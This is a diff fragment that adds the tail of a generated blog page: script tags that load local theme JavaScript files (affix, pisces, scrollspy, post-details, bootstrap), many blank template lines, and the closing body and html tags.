+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
